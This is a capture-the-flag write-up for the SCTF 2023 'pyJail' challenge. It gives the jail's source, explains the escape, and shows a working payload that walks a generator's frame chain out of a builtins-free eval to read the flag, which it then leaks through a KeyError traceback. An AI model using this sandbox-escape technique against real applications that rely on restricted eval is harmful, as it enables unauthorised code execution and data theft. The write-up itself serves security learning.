## pyJail

### Description
Make your flag generator!

### Source
```python
import string

flag = open("./flag.txt").read()
code = input("makeflag> ")[:100]

if any(c not in string.printable for c in code):
    print("🙅‍")
elif "__" in code:
    print("__nope__")
else:
    if flag == eval(code, {"__builtins__": {}}, {"__builtins__": {}}):
        print("Oh, you know flag")
    else:
        print("Nope")
```

### Exploit
This challenge is a python jailbreak from restricted `eval` function. \
Our goal is to get `flag` value, which is not accessible in `eval` directly. \
However, we can access it using python's generators.

Python's generator has `gi_frame.f_back` which references previous function frames, even before `eval`. \
As it is only accessible while the generator is running, we should make a code that defines a generator accessing `flag` and unpacks the generator.

Also, we should leak the value of `flag`, as the server only prints `"Oh, you know flag"` message. \
In Dockerfile, it is shown that `stderr` is also printed in `socat`. \
Thus, we can simple leak any string using `{}[blabla]` as it may make error like `KeyError: 'blabla'`.

As a result, this code can leak `flag`: 
```
[a:=[],a.append({}[b.gi_frame.f_back.f_back.f_globals['flag']]for b in a),*a[0]]
```

Then, the server responds:
```
makeflag> [a:=[],a.append({}[b.gi_frame.f_back.f_back.f_globals['flag']]for b in a),*a[0]]
Traceback (most recent call last):
  File "/mnt/h/sctf2023/files/pyjail/jail.py", line 11, in <module>
    if flag == eval(code, {"__builtins__": {}}, {"__builtins__": {}}):
  File "<string>", line 1, in <module>
  File "<string>", line 1, in <genexpr>
KeyError: 'SCTF{i_d0nt_w4nt_pyjail_anymore}\n'
```

`flag` is `SCTF{i_d0nt_w4nt_pyjail_anymore}`